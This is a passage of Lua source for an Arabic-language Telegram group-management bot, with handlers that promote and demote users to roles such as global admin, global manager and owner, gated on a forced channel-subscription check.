local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:bot3', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور ثالث @(.*)$") and SudoBot2(msg) then
local username = text:match("^تنزيل مطور ثالث @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Sudo:bot3', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من مطور ثالث'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور ثالث (%d+)$") and SudoBot2(msg) then
local userid = text:match("^تنزيل مطور ثالث (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Sudo:bot3', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("رفع ادمن عام") and msg.reply_to_message_id_ then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Gmod:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع ادمن عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^رفع ادمن عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن عام'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع ادمن عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^رفع ادمن عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Gmod:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته ادمن عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل ادمن عام") and msg.reply_to_message_id_ then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Gmod:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل ادمن عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^تنزيل ادمن عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Gmod:User', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه العامين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل ادمن عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^تنزيل ادمن عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Gmod:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه العامين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من الادمنيه العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end



if text == ("رفع مدير عام") and msg.reply_to_message_id_ then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Gmanager', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مدير عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^رفع مدير عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير عام'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مدير عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^رفع مدير عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Gmanager', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مدير عام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مدير عام") and msg.reply_to_message_id_ then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Gmanager', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مدير عام @(.*)$") and SudoBot3(msg)  then
local username = text:match("^تنزيل مدير عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Gmanager', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء العامين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير عام (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^تنزيل مدير عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Gmanager', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء العامين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المدراء العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end



if text == ("مسح قائمه المالك") then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n⋄تم مسح قائمه المالك')
return false
end

if text == 'قائمه المالك' then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n⋄قائمه المالك \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("صيح للمالك") or text == ("تاك للمالك") then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n⋄وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع مالك") and msg.reply_to_message_id_ then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مالك @(.*)$") and SudoBot3(msg)  then
local username = text:match("^رفع مالك @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مالك'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع مالك (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^رفع مالك (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مالك'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل مالك") and msg.reply_to_message_id_ then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المالكين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك @(.*)$") and SudoBot3(msg)  then
local username = text:match("^تنزيل مالك @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المالكين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك (%d+)$") and SudoBot3(msg)  then
local userid = text:match("^تنزيل مالك (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
